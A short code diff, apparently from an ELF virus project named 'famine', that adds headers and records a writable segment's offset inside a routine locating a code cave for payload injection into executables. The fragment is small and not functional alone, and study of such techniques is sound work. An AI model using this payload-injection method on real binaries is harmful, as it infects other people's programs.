@@ -3,6 +3,10 @@
 #include "map.h"
 #include "utils.h"
 #include <string.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include "famine.h"
+#include <sys/syscall.h>
 
 int	bss(t_data *data, size_t payload_size) {
 
@@ -23,6 +27,8 @@ int	bss(t_data *data, size_t payload_size) {
 
 	for (size_t i = ehdr->e_phnum; i--;) {
 		if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)) {
+
+			data->data_offset = phdr[i].p_offset;
 
 			data->cave.offset = phdr[i].p_offset + phdr[i].p_filesz;
 			data->cave.addr = phdr[i].p_vaddr + phdr[i].p_filesz;
